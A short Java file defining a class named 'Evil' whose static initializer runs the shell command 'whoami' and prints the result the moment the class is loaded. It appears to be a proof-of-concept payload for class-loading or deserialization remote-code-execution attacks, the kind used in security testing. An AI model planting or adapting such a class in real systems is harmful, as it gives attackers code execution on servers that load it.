import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class Evil {
    static {
        try{
            Process process = Runtime.getRuntime().exec("whoami");
            BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = br.readLine()) != null) {
                System.out.println(line);
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
